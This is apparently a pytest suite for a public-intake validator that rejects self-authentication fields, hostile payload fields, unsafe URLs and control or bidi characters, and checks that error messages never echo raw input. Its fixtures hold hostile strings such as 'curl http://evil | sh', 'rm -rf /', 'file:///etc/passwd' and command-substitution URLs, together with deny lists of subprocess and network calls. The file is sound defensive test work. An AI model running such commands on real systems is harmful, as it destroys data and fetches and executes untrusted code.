#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for FoundUp LaunchRequest -- public input cannot self-authenticate or become code."""

from __future__ import annotations

import ast
import copy
import json
from pathlib import Path

import pytest

from modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request import (
    LaunchRequest,
    LaunchRequestError,
    LaunchRequestIntakeContext,
    to_genesis_envelope,
    validate_launch_request,
)
from modules.ai_intelligence.ai_overseer.src.foundup_genesis.envelope import LifecycleStage
from modules.ai_intelligence.ai_overseer.src.foundup_genesis.validator import (
    validate_genesis_envelope,
)

MODULE_SRC = (
    Path(__file__).resolve().parents[1] / "src" / "foundup_genesis" / "launch_request.py"
)


def _clean_payload() -> LaunchRequest:
    return LaunchRequest(
        proposed_name="Get Kei Truck Marketplace",
        problem_statement="Help people buy and sell used Kei trucks safely.",
        intended_users="scouts, buyers, sellers",
        category="marketplace",
        reference_urls=["https://example.com/kei-trucks"],
        requested_type="marketplace",
    )


def _authed() -> LaunchRequestIntakeContext:
    return LaunchRequestIntakeContext(authenticated=True, requester_handle="alice")


# --- positive ---------------------------------------------------------------

def test_clean_authenticated_validates():
    assert validate_launch_request(_clean_payload(), _authed()).ok


def test_clean_invite_verified_validates():
    ctx = LaunchRequestIntakeContext(invite_token_verified=True, requester_handle="bob")
    assert validate_launch_request(_clean_payload(), ctx).ok


def test_maps_to_genesis_valid_envelope():
    env = to_genesis_envelope(_clean_payload(), _authed())
    res = validate_genesis_envelope(env, strict_mode=False)
    assert res.is_valid, res.errors


# --- intake gate (Addendum C: context only) ---------------------------------

def test_intake_gate_rejects_unauthenticated():
    res = validate_launch_request(_clean_payload(), LaunchRequestIntakeContext())
    assert not res.ok
    assert any("intake gated" in e for e in res.errors)


def test_unauthenticated_mapping_raises():
    with pytest.raises(LaunchRequestError):
        to_genesis_envelope(_clean_payload(), LaunchRequestIntakeContext())


# --- self-authentication rejection (the load-bearing fix) -------------------

@pytest.mark.parametrize("bad", [
    {"authenticated": True},
    {"invite_token_present": True},
    {"invite_token_verified": True},
    {"auth": {"passed": True}},
    {"role": "admin"},
    {"is_admin": True},
    {"authorized": True},
    {"authEnticated": True},          # case/camel evasion
    {"invite-token-verified": True},  # separator evasion
])
def test_payload_cannot_self_authenticate(bad):
    payload = {"proposed_name": "X", "category": "marketplace"}
    payload.update(bad)
    # Even with a passing context, a self-auth field in the PAYLOAD is rejected.
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"self-auth field not rejected: {bad}"


# --- hostile input rejected -------------------------------------------------

@pytest.mark.parametrize("bad", [
    {"exec": "curl http://evil | sh"},
    {"command": "rm -rf /"},
    {"external_repo_requested": True},
    {"create_repo": True},
    {"source_authority": "external_proto"},
    {"lifecycle_stage": "mvp"},
    {"merge_approved": True},
    {"gate_passed": True},
    {"api_key": "sk-ABCDEFGHIJKLMNOP1234"},
    {"externalRepoRequested": True},   # camel evasion
])
def test_hostile_payload_fields_rejected(bad):
    payload = {"proposed_name": "X", "category": "marketplace"}
    payload.update(bad)
    assert not validate_launch_request(payload, _authed()).ok, f"hostile field not rejected: {bad}"


# --- reference_urls hygiene -------------------------------------------------

@pytest.mark.parametrize("bad_url", [
    "file:///etc/passwd",
    "/etc/passwd",
    "modules/foundups/getk",
    "https://x.com/$(whoami)",
    "javascript:alert(1)",
    "https://x.com/a; rm -rf /",
])
def test_bad_reference_urls_rejected(bad_url):
    payload = LaunchRequest(proposed_name="X", category="marketplace", reference_urls=[bad_url])
    assert not validate_launch_request(payload, _authed()).ok, f"bad url not rejected: {bad_url!r}"


def test_clean_public_urls_pass():
    payload = LaunchRequest(
        proposed_name="X", category="marketplace",
        reference_urls=["https://example.com/a", "http://example.org/b"],
    )
    assert validate_launch_request(payload, _authed()).ok


# --- mapping invariants -----------------------------------------------------

def test_mapping_forces_no_external_repo_and_idea_stage():
    env = to_genesis_envelope(_clean_payload(), _authed())
    assert env.external_repo_requested is False
    assert env.lifecycle_stage in (LifecycleStage.IDEA, LifecycleStage.INCUBATING)
    assert "source_authority" not in env.to_dict()


def test_requester_handle_from_context_not_payload():
    # A payload-supplied requester_handle must NOT become the trusted requested_by.
    payload = LaunchRequest(proposed_name="X", category="marketplace", requester_handle="attacker")
    env = to_genesis_envelope(payload, LaunchRequestIntakeContext(authenticated=True, requester_handle="alice"))
    assert env.requested_by == "alice"
    assert env.requested_by != "attacker"


def test_mapping_without_context_handle_uses_public_intake():
    env = to_genesis_envelope(LaunchRequest(proposed_name="X", category="marketplace"),
                              LaunchRequestIntakeContext(authenticated=True))
    assert env.requested_by == "public_intake"


# --- redaction --------------------------------------------------------------

def test_secret_in_problem_statement_redacted():
    payload = LaunchRequest(
        proposed_name="X", category="marketplace",
        problem_statement="our key is sk-ABCDEFGHIJKLMNOP1234 do not leak",
    )
    blob = json.dumps(payload.to_dict())
    assert "sk-ABCDEFGHIJKLMNOP1234" not in blob
    assert "[REDACTED]" in blob


def test_raw_dict_secret_redacted_at_envelope_sink():
    # SENTINEL finding: a RAW dict (never through LaunchRequest.to_dict) must NOT
    # leak a secret from problem_statement into the envelope description/tagline/name.
    payload = {
        "proposed_name": "Mall sk-NAMEKEY1234567890 X",
        "category": "marketplace",
        "problem_statement": "our key is sk-ABCDEFGHIJKLMNOP1234 do not leak",
    }
    env = to_genesis_envelope(payload, _authed())
    blob = json.dumps(env.to_dict())
    assert "sk-ABCDEFGHIJKLMNOP1234" not in blob, "raw-dict problem_statement secret leaked"
    assert "sk-NAMEKEY1234567890" not in blob, "raw-dict proposed_name secret leaked"


# --- GetK walkthrough -------------------------------------------------------

def test_getk_walkthrough_maps_to_valid_envelope():
    payload = LaunchRequest(
        proposed_name="Get Kei Truck Marketplace",
        problem_statement="AI-managed marketplace for used Kei trucks; reusable for any used item.",
        intended_users="scouts, buyers, sellers",
        category="marketplace",
        requested_type="marketplace",
    )
    env = to_genesis_envelope(payload, _authed())
    assert env.foundup_id.startswith("get_kei_truck")
    assert env.external_repo_requested is False
    assert validate_genesis_envelope(env, strict_mode=False).is_valid


# --- AST: no runtime / network / subprocess / file-write --------------------

def _module_ast():
    return ast.parse(MODULE_SRC.read_text(encoding="utf-8"))


def test_module_imports_no_runtime_or_network():
    tree = _module_ast()
    mods = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for a in node.names:
                mods.add(a.name)
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                mods.add(node.module)
    banned_roots = {"subprocess", "socket", "ssl", "urllib", "requests", "httpx",
                    "http", "ctypes", "importlib", "multiprocessing", "os", "sys",
                    "shutil", "pickle", "marshal", "pathlib"}
    bad_root = {m for m in mods if m.split(".")[0] in banned_roots}
    assert not bad_root, f"banned module import: {bad_root}"
    # Forbid Hermes/Kanban/OpenClaw RUNTIME -- but the pure #807 contract
    # kanban_plugin_contract (a WRE-side type module) is the SANCTIONED reuse.
    runtime_markers = ("hermes", "openclaw", "foundup_job_consumer", "wre_core",
                       "foundup_job_executor")
    bad_runtime = {m for m in mods if any(k in m for k in runtime_markers)}
    assert not bad_runtime, f"runtime import: {bad_runtime}"
    assert any("kanban_plugin_contract" in m for m in mods), "must reuse #807 contract (import, not copy)"


def test_module_makes_no_exec_process_network_or_write_calls():
    tree = _module_ast()
    banned_names = {"open", "eval", "exec", "compile", "__import__", "input"}
    banned_attrs = {"system", "popen", "Popen", "run", "call", "check_call",
                    "check_output", "write", "write_text", "write_bytes",
                    "urlopen", "connect", "spawn", "fork", "remove", "unlink"}
    name_bad, attr_bad = [], []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            f = node.func
            if isinstance(f, ast.Name) and f.id in banned_names:
                name_bad.append(f.id)
            elif isinstance(f, ast.Attribute) and f.attr in banned_attrs:
                attr_bad.append(f.attr)
    assert not name_bad, f"banned builtin calls: {name_bad}"
    assert not attr_bad, f"banned attr calls: {attr_bad}"


def test_no_kanban_publish_or_card_symbols():
    src = MODULE_SRC.read_text(encoding="utf-8").lower()
    for forbidden in ("cardspec", "kanban_publish", "publish_card", "kanban_create",
                      "worker_spawn", "drain_", "get_job_queue"):
        assert forbidden not in src, f"launch request must not publish to Kanban: {forbidden}"


# ===========================================================================
# #823 -- CONTROL / FORMAT CHARACTER REJECTION IN PUBLIC DISPLAY FIELDS
#
# A control char (e.g. U+0000) in a display field was ACCEPTED by the Phase-1
# validators and silently SANITIZED into a normal name at envelope construction
# (via _normalize NFKC + redact), producing a draft FoundUp with a laundered
# display name. The fix REJECTS the value at validation time, on the RAW value,
# BEFORE any envelope is constructed. Reject -- do NOT sanitize/strip/coerce.
#
# ARCHITECT-pinned policy (Addendum A): reject ALL Unicode category Cc, plus the
# dangerous Cf subset (zero-width 200B/200C/200D/FEFF/2060; bidi/isolates
# 202A-202E, 2066-2069). description is NOT exempt -- newline is a Cc char.
#
# ALL control/format/Unicode fixtures are built from CODEPOINTS via chr() or
# \uXXXX escapes so this SOURCE FILE stays pure ASCII (byte-check clean).
# ===========================================================================

# Representative Unicode category Cc sweep (C0 + DEL + C1) -- codepoints only.
_CC_SWEEP_CODEPOINTS = {
    "NUL_0x00": 0x00,
    "TAB_0x09": 0x09,
    "LF_0x0A": 0x0A,
    "CR_0x0D": 0x0D,
    "ESC_0x1B": 0x1B,
    "DEL_0x7F": 0x7F,
    "NEL_0x85": 0x85,   # C1
    "APC_0x9F": 0x9F,   # C1
}

# The ARCHITECT-pinned dangerous Cf subset -- codepoints only.
_CF_PINNED_CODEPOINTS = {
    "ZWSP_200B": 0x200B,
    "ZWNJ_200C": 0x200C,
    "ZWJ_200D": 0x200D,
    "BOM_FEFF": 0xFEFF,
    "WJ_2060": 0x2060,
    "LRE_202A": 0x202A,
    "RLE_202B": 0x202B,
    "PDF_202C": 0x202C,
    "LRO_202D": 0x202D,
    "RLO_202E": 0x202E,
    "LRI_2066": 0x2066,
    "RLI_2067": 0x2067,
    "FSI_2068": 0x2068,
    "PDI_2069": 0x2069,
}

# The four DISPLAY fields in scope for validate_launch_request.
_LR_DISPLAY_FIELDS = ["proposed_name", "problem_statement", "intended_users", "requested_type"]

# Negative controls that MUST still be ACCEPTED (Addendum E: do NOT over-broaden;
# this is NOT an ASCII-only rule). Unicode letters are built from chr(codepoint) so
# this SOURCE stays pure ASCII (a formatter cannot collapse chr() into a literal char).
_NEGATIVE_DISPLAY_VALUES = [
    "Caf" + chr(0x00E9) + " " + chr(0x00C9) + "tude",   # accented Latin: e-acute + E-acute
    chr(0x672A) + chr(0x6765) + " FoundUp",             # CJK "future" (mirai) + FoundUp
    "O'Hara-Smith (test)",                              # ordinary ASCII punctuation
]


def _payload_with(field, value):
    """A clean proposal dict with one display field overridden (raw, un-redacted)."""
    base = {"proposed_name": "Clean Name", "category": "marketplace"}
    base[field] = value
    return base


@pytest.mark.parametrize("char_name,cp", sorted(_CC_SWEEP_CODEPOINTS.items()))
@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
def test_cc_control_char_rejected_per_display_field(field, char_name, cp):
    payload = _payload_with(field, "Good" + chr(cp) + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field} with {char_name} not rejected"
    assert any(f"{field} contains disallowed control/format character" in e for e in res.errors)


@pytest.mark.parametrize("char_name,cp", sorted(_CF_PINNED_CODEPOINTS.items()))
@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
def test_cf_format_char_rejected_per_display_field(field, char_name, cp):
    payload = _payload_with(field, "Good" + chr(cp) + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field} with {char_name} not rejected"
    assert any(f"{field} contains disallowed control/format character" in e for e in res.errors)


def test_control_char_rejected_on_launchrequest_dataclass_raw_value():
    # The dataclass path reads the RAW attribute (NOT to_dict(), which redacts),
    # so detection sees the original codepoint before any normalization.
    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any("proposed_name contains disallowed control/format character" in e for e in res.errors)


def test_newline_rejected_in_problem_statement_phase1():
    # description-class free text is NOT exempt: a newline (LF, Cc) is rejected this phase.
    payload = _payload_with("problem_statement", "line one" + chr(0x0A) + "line two")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any("problem_statement contains disallowed control/format character" in e for e in res.errors)


@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
@pytest.mark.parametrize("bad_value", [123, True, {"k": "v"}, ["x"], 4.5])
def test_non_string_display_field_rejected(field, bad_value):
    payload = _payload_with(field, bad_value)
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field}={bad_value!r} (non-string) not rejected"
    assert any(f"{field} must be a string" in e for e in res.errors)


@pytest.mark.parametrize("field", ["problem_statement", "intended_users", "requested_type"])
def test_optional_display_field_absent_is_preserved(field):
    # An optional display field absent from a raw dict (None) is allowed -- no false reject.
    payload = {"proposed_name": "Clean Name", "category": "marketplace"}
    payload.pop(field, None)
    assert validate_launch_request(payload, _authed()).ok, f"absent optional {field} wrongly rejected"


@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
@pytest.mark.parametrize("value", _NEGATIVE_DISPLAY_VALUES)
def test_unicode_letters_not_false_positive_rejected(field, value):
    # Accented Latin / CJK / ordinary punctuation are real letters/marks, NOT Cc/Cf.
    # They MUST still be accepted (this is not an ASCII-only rule).
    payload = _payload_with(field, value)
    assert validate_launch_request(payload, _authed()).ok, f"{field}={value!r} wrongly rejected"


def test_plain_space_in_display_field_accepted():
    # A plain ASCII space (category Zs) is a valid display char, never rejected.
    payload = _payload_with("proposed_name", "Good Name With Spaces")
    assert validate_launch_request(payload, _authed()).ok


def test_reject_error_never_echoes_raw_control_char():
    # SAFE error policy: the error names the field + policy class, never the raw value,
    # repr(value), the offending char, or raw bytes. Use RLO (U+202E) as the offender.
    offender = chr(0x202E)
    payload = _payload_with("proposed_name", "Good" + offender + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    for e in res.errors:
        assert offender not in e
        assert "Good" not in e  # the raw value is not echoed at all
        assert repr("Good" + offender + "Name") not in e


def test_control_char_rejected_before_envelope_construction():
    # ADDENDUM D: proposed_name with a control char (the architect note renders it as a
    # space inside "Good Name"; encoded here as an embedded NUL U+0000) -- the OLD path
    # laundered it into a draft; the NEW path rejects BEFORE to_genesis_envelope. We prove
    # the envelope is never constructed: to_genesis_envelope raises LaunchRequestError and
    # produces no envelope dict.
    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace")
    with pytest.raises(LaunchRequestError) as exc:
        to_genesis_envelope(payload, _authed())
    # The raise carries the SAFE error, never the raw control byte.
    assert chr(0x00) not in str(exc.value)
    assert "contains disallowed control/format character" in str(exc.value)


def test_control_char_envelope_construction_not_reached_spy():
    # ADDENDUM D (construction-not-reached, spied): monkeypatch the envelope constructor
    # in the launch_request module; a control-char name must reject BEFORE it is called.
    import modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request as lr

    calls = {"n": 0}
    real_ctor = lr.FoundUpGenesisEnvelope

    def _spy_ctor(*a, **k):
        calls["n"] += 1
        return real_ctor(*a, **k)

    lr.FoundUpGenesisEnvelope = _spy_ctor
    try:
        with pytest.raises(LaunchRequestError):
            lr.to_genesis_envelope(
                LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace"),
                _authed(),
            )
    finally:
        lr.FoundUpGenesisEnvelope = real_ctor
    assert calls["n"] == 0, "envelope constructor was reached for a rejected display field"


# ===========================================================================
# FOUNDUP_LAUNCH_REQUEST_ERROR_NO_RAW_ECHO_PHASE1
#
# WHY: the #826 genesis-validator hardening DEFERRED two validate_launch_request
# error strings that echoed user-derived content:
#   - "shell/code metacharacters in reference: {sorted(bad)}"   (_check_url_ref)
#   - "forbidden/unknown payload field: {key!r}"                (allowed-fields loop)
# validate_launch_request is the PUBLIC-INTAKE validator (the #823 transport
# pre-flight + to_genesis_envelope both call it), so its error strings must be
# echo-free to match the #826 invariant. This slice rewords MESSAGE TEXT ONLY
# (no validation logic change) so no launch_request-LOCAL error -- and no
# LaunchRequestError raised via to_genesis_envelope -- echoes the raw value,
# repr(), the offending char, or raw bytes.
#
# All hostile fixtures are built from CODEPOINTS via chr()/\uXXXX so this SOURCE
# FILE stays pure ASCII (byte-check clean).
# ===========================================================================

# Hostile, ASCII-source-safe substrings used to build malicious payloads. We assert
# NONE of these (nor their escaped/repr forms) appear in any LAUNCH-REQUEST-LOCAL error.
#
# NOTE on the field-key fixtures: a key with CONTROL/BIDI chars ALSO trips the IMPORTED
# #807 _scan_authority "non-ASCII / non-printable key rejected" echo (a DEFERRED site --
# see Addendum E). To prove the LAUNCH-LOCAL allowed-fields loop never echoes the key, the
# per-site no-echo tests use a PRINTABLE-ASCII unknown key (reaches the local loop without
# tripping the #807 non-ASCII-key echo). The control/bidi key is exercised separately by the
# #807 deferral test, where the #807 echo is EXPECTED and DOCUMENTED, not a regression.
_HOSTILE_FIELD_KEY = "evil_unknown_secret_field"            # printable-ASCII forbidden/unknown KEY
_HOSTILE_FIELD_KEY_CTRL = "ev" + chr(0x00) + "il_" + chr(0x202E) + "key"  # control+bidi (trips #807)
_HOSTILE_AUTH_KEY = "is_admin"                              # a forbidden auth KEY
# A PRINTABLE-ASCII reference URL with shell metachars (so it passes the printable-ASCII and
# scheme checks and REACHES the metachar check -- a control char would short-circuit earlier).
_HOSTILE_METACHAR_URL = "https://x.com/$(rm -rf /);`whoami`|cat"
_HOSTILE_VALUE = "secret-sk-ABCDEFGHIJKLMNOP1234"

# Control / escape forms that must NEVER appear in an error string (Addendum D).
_CONTROL_CHARS = [chr(0x00), "\r", "\n", "\t", chr(0x1B), chr(0x202E)]
_ESCAPED_FORMS = ["\\x00", "\\u0000", "\\r", "\\n", "\\t", "\\x1b", "\\u202e"]


def _assert_error_is_leak_free(err: str, *raw_inputs: str) -> None:
    """ADDENDUM D -- reusable control/escape leak scanner.

    Assert a single error string contains NONE of:
      - any raw hostile key/value substring passed in `raw_inputs`;
      - a raw control char (NUL/CR/LF/TAB/ESC/RLO);
      - an escaped form derived from input (\\x00 / \\u0000 / \\r / \\n / \\t / etc.);
      - a repr() wrapper around any raw input;
      - the shell-metacharacter list values (sorted(...) style) from hostile URLs.
    """
    for raw in raw_inputs:
        if raw:
            assert raw not in err, f"raw input leaked into error: {err!r}"
            assert repr(raw) not in err, f"repr(raw input) leaked into error: {err!r}"
    for ctrl in _CONTROL_CHARS:
        assert ctrl not in err, f"raw control char leaked into error: {err!r}"
    for esc in _ESCAPED_FORMS:
        assert esc not in err, f"escaped control form leaked into error: {err!r}"
    # The sorted-metachar LIST rendering (e.g. "['$', ';', '`']") must never appear -- a
    # quoted single metachar inside square brackets is the tell-tale of the old echo.
    _METACHAR_LIST_TELLS = ["'$'", "'`'", "'|'", "'&'", "';'", "'>'", "'<'", "'('", "')'"]
    assert not any(tell in err for tell in _METACHAR_LIST_TELLS), \
        f"shell metachar list leaked into error: {err!r}"


def _all_errors_leak_free(errors, *raw_inputs):
    for e in errors:
        _assert_error_is_leak_free(e, *raw_inputs)


# --- per-site no-echo (the three reworded launch_request-LOCAL sites) --------

def test_forbidden_field_key_not_echoed():
    # Allowed-fields loop: a forbidden/unknown KEY (with embedded control + bidi chars)
    # must NOT appear in any error -- not the key, not repr(key), not the offending char.
    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY: "v"}
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    # Field-class locality preserved (Addendum C): operator learns the field class.
    assert any(e == "payload contains a forbidden or unknown field" for e in res.errors)
    _all_errors_leak_free(res.errors, _HOSTILE_FIELD_KEY)


def test_auth_authority_field_key_not_echoed():
    # _scan_auth_fields: a forbidden auth KEY must NOT be echoed; the message names the
    # auth/authority POLICY CLASS only (field-family locality, no raw key).
    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_AUTH_KEY: True}
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any(e.startswith("payload contains a forbidden auth/authority field") for e in res.errors)
    # The raw auth key must not be echoed by the LAUNCH-REQUEST-LOCAL auth scan.
    assert not any(
        (_HOSTILE_AUTH_KEY in e and "self-assert" in e) for e in res.errors
    ), "launch_request-local auth scan echoed the raw key"


def test_reference_metachars_not_echoed():
    # _check_url_ref: the shell/code metachar LIST must NOT be echoed; the message names
    # the field (reference_urls[i] index locality) + rule class only.
    payload = LaunchRequest(proposed_name="X", category="marketplace",
                            reference_urls=[_HOSTILE_METACHAR_URL])
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any(
        e == "reference_urls[0] contains shell/code metacharacters" for e in res.errors
    ), f"expected safe metachar message with index locality; got {res.errors}"
    # No metachar list, no raw URL, no offending chars in ANY launch_request-local error.
    local = _launch_request_local_errors(res.errors)  # exclude IMPORTED #807 lines
    for e in local:
        assert _HOSTILE_METACHAR_URL not in e
        assert "sorted(" not in e
        # the metachar list rendering "[';', ...]" never appears
        assert not (e.startswith("reference_urls[0]") and "[" in e and "'" in e)


def test_proposed_name_required_message_is_safe():
    # The required-name message carries no raw value (it fires when the name is empty).
    res = validate_launch_request({"category": "marketplace", "proposed_name": "   "}, _authed())
    assert not res.ok
    assert any(e == "proposed_name is required" for e in res.errors)


def test_intake_gate_message_is_safe():
    res = validate_launch_request({"proposed_name": "X", "category": "marketplace"},
                                  LaunchRequestIntakeContext())
    assert not res.ok
    gate = [e for e in res.errors if "intake gated" in e]
    assert gate
    _all_errors_leak_free(gate)


# --- error-scanner battery across every launch_request-LOCAL invalid class --

def _launch_request_local_errors(errors):
    """Drop errors that originate in the IMPORTED #807 _scan_authority (kanban_plugin_
    contract.py), leaving only launch_request-LOCAL sites. The #807 no-raw-echo fix LANDED
    (FOUNDUP_KANBAN_CONTRACT_ERROR_NO_RAW_ECHO_PHASE1), so these stems now match the SAFE
    rule-only messages (the fixed marker class is retained as taxonomy)."""
    _807_STEMS = (
        "value carries a forbidden authority marker",
        "source_authority promotion is forbidden",
        "forbidden authority field present",
        "non-string key rejected",
        "non-ASCII / non-printable key",
        "verified=true is forbidden",
        "promotion flag is forbidden",
        "shell-string command is forbidden",
    )
    return [e for e in errors if not any(stem in e for stem in _807_STEMS)]


# Each entry exercises a distinct launch_request-LOCAL error site with a hostile,
# user-controlled value that MUST NOT be echoed. (payload, raw_inputs_that_must_not_leak)
def _battery():
    return [
        ("unknown_field", {"proposed_name": "X", "category": "marketplace",
                           _HOSTILE_FIELD_KEY: "v"}, [_HOSTILE_FIELD_KEY]),
        ("auth_field", {"proposed_name": "X", "category": "marketplace",
                        "authorization": _HOSTILE_VALUE}, ["authorization", _HOSTILE_VALUE]),
        ("auth_field_camel", {"proposed_name": "X", "category": "marketplace",
                              "isAdmin": True}, ["isAdmin"]),
        ("refurl_metachar", {"proposed_name": "X", "category": "marketplace",
                             "reference_urls": [_HOSTILE_METACHAR_URL]}, [_HOSTILE_METACHAR_URL]),
        ("refurl_file", {"proposed_name": "X", "category": "marketplace",
                         "reference_urls": ["file:///etc/passwd"]}, ["file:///etc/passwd"]),
        ("refurl_nonascii", {"proposed_name": "X", "category": "marketplace",
                             "reference_urls": ["https://x.com/caf" + chr(0xe9)]},
         ["https://x.com/caf" + chr(0xe9)]),
        ("display_control_name", {"proposed_name": "Good" + chr(0x00) + "Name",
                                  "category": "marketplace"}, ["Good"]),
    ]


@pytest.mark.parametrize("label,payload,raw_inputs", [(b[0], b[1], b[2]) for b in _battery()])
def test_error_scanner_battery_no_launch_local_raw_echo(label, payload, raw_inputs):
    # ADDENDUM D: every launch_request-LOCAL error for every invalid class is leak-free.
    res = validate_launch_request(copy.deepcopy(payload), _authed())
    assert not res.ok, label
    local = _launch_request_local_errors(res.errors)
    assert local, f"{label}: expected at least one launch-local error"
    _all_errors_leak_free(local, *raw_inputs)


def test_launchrequesterror_message_is_safe():
    # ADDENDUM D: the LaunchRequestError raised by to_genesis_envelope joins the error
    # list; its message must be leak-free for every launch_request-LOCAL failure.
    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace",
                            reference_urls=[_HOSTILE_METACHAR_URL])
    with pytest.raises(LaunchRequestError) as exc:
        to_genesis_envelope(payload, _authed())
    msg = str(exc.value)
    # The joined message may contain #807 echoes (deferred); assert the LAUNCH-LOCAL
    # offenders we control are absent and no control/escape forms leak from local sites.
    assert _HOSTILE_METACHAR_URL not in msg
    for ctrl in _CONTROL_CHARS:
        assert ctrl not in msg, "raw control char leaked into LaunchRequestError message"


def test_launchrequesterror_unknown_field_key_not_echoed():
    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY: "v"}
    with pytest.raises(LaunchRequestError) as exc:
        to_genesis_envelope(payload, _authed())
    msg = str(exc.value)
    assert _HOSTILE_FIELD_KEY not in msg
    assert "payload contains a forbidden or unknown field" in msg


# --- ADDENDUM E: #807 _scan_authority echo is DEFERRED, not modified ---------

def test_807_scan_authority_no_raw_echo_after_deferral_landed():
    """The IMPORTED #807 _scan_authority (kanban_plugin_contract.py) authority-class echo was
    DEFERRED by the #830 launch_request slice; FOUNDUP_KANBAN_CONTRACT_ERROR_NO_RAW_ECHO_PHASE1
    has now LANDED that fix. The source_authority-promotion rejection is still produced (outcome
    unchanged) but the message is now the SAFE rule-only phrasing -- no raw value/key/trail.
    The raw promotion value ('external_proto') must NOT appear in ANY error."""
    payload = {"proposed_name": "X", "category": "marketplace", "source_authority": "external_proto"}
    res = validate_launch_request(dict(payload), _authed())
    assert not res.ok
    # The #807 rejection still fires, now with the SAFE rule-only message (no raw value).
    assert any(e == "source_authority promotion is forbidden (only monorepo_poc)" for e in res.errors), \
        "expected the safe #807 rule-only message after the no-raw-echo fix landed"
    # No raw promotion value leaks from ANY error (the old echo carried 'external_proto').
    for e in res.errors:
        assert "external_proto" not in e


def test_807_non_ascii_key_echo_is_documented_and_deferred():
    """A control/bidi-decorated KEY trips the IMPORTED #807 non-printable-key rejection
    (kanban_plugin_contract.py 'non-ASCII / non-printable key rejected'). After the no-raw-echo
    fix LANDED, this message is the SAFE rule-only phrasing -- the raw key is NOT echoed by it
    OR by the launch_request-LOCAL allowed-fields message (the class name, never the key)."""
    payload = {"proposed_name": "X", "category": "marketplace", _HOSTILE_FIELD_KEY_CTRL: "v"}
    res = validate_launch_request(dict(payload), _authed())
    assert not res.ok
    # Safe #807 rule-only message present, EXACTLY (no raw key/trail prefix any more).
    assert any(e == "non-ASCII / non-printable key rejected" for e in res.errors), \
        "expected the safe #807 non-printable-key message after the no-raw-echo fix landed"
    # Launch-LOCAL message for this key is the safe class name (no raw key).
    assert any(e == "payload contains a forbidden or unknown field" for e in res.errors)
    # The raw key leaks from NO error -- not the #807 line, not the launch-local line.
    _all_errors_leak_free(res.errors, _HOSTILE_FIELD_KEY_CTRL)


def test_807_module_no_longer_carries_raw_echo_lines():
    """The #807 no-raw-echo fix (FOUNDUP_KANBAN_CONTRACT_ERROR_NO_RAW_ECHO_PHASE1) has LANDED:
    the DEFERRED raw-echo lines that interpolated the user key/value/trail are GONE from
    kanban_plugin_contract.py, replaced by SAFE rule-only messages (the fixed marker class is
    retained as taxonomy). This pins the completed invariant from the launch_request side."""
    contract = (
        Path(__file__).resolve().parents[3]
        / "foundups" / "agent" / "src" / "kanban_plugin_contract.py"
    )
    src = contract.read_text(encoding="utf-8")
    # The OLD raw-echo f-string fragments must be ABSENT (no {trail}/{key}/{value}/{node!r}).
    assert "is a source_authority promotion (only monorepo_poc)" not in src  # old: f"...'{value}'..."
    assert "value carries authority '" not in src                            # old: f"...'{carried}': {node!r}"
    assert "non-string key {" not in src                                     # old: f"...{key!r}"
    # The SAFE rule-only replacements ARE present (class kept for the marker taxonomy).
    assert "source_authority promotion is forbidden (only monorepo_poc)" in src
    assert "value carries a forbidden authority marker (class: " in src
    assert "non-string key rejected" in src


# ===========================================================================
# ADDENDUM A -- ERROR CATEGORY PARITY (not just count): SELF-CONTAINED.
#
# CI-robustness (SENTINEL): GitHub Actions checks out a SHALLOW PR ref, so
# `git show origin/main` is usually unavailable -> the old origin-baseline tests
# would pytest.skip in CI, silently disabling the parity guard and violating this
# slice's NO_SKIP_XFAIL invariant. These parity guards are now self-contained:
# they have NO runtime git / origin/main / subprocess / network dependency and
# RUN+PASS deterministically in CI with zero skips.
#
# The guard compares STABLE rule CATEGORIES (and `ok`), NOT error count, against a
# CHECKED-IN expected map (_EXPECTED_PARITY below). Error TEXT may differ at the
# reworded sites; the rule CATEGORY must not. Any future LOGIC change that alters
# which rule fires (or the ok/created outcome) forces a conscious update of the
# checked-in expectation -- which is exactly the guard's purpose.
# ===========================================================================


def _categorize(err: str) -> str:
    e = err
    if "trusted LaunchRequestIntakeContext is required" in e:
        return "context_required"
    if "intake gated" in e:
        return "intake_gate"
    if "proposed_name is required" in e:
        return "required_field"
    if e.startswith("forbidden/unknown payload field") or e == "payload contains a forbidden or unknown field":
        return "unknown_or_forbidden_field"
    if "public payload cannot self-assert auth/authority" in e or e.startswith("payload contains a forbidden auth/authority field"):
        return "auth_authority_field"
    if "reference must be a non-empty URL string" in e or "reference must be printable ASCII" in e:
        return "reference_url_type"
    if "reference must be a public http(s) URL" in e:
        return "reference_url_scheme"
    if "shell/code metacharacters in reference" in e or "contains shell/code metacharacters" in e:
        return "reference_url_metachar"
    if "must be a string" in e:
        return "display_type"
    if "contains disallowed control/format character" in e:
        return "display_control_char"
    if ("value carries a forbidden authority marker" in e or "source_authority promotion is forbidden" in e
            or "forbidden authority field present" in e or "non-string key rejected" in e
            or "non-ASCII / non-printable key" in e or "verified=true is forbidden" in e
            or "promotion flag is forbidden" in e or "shell-string command is forbidden" in e):
        return "authority_807"
    return "UNCLASSIFIED::" + e
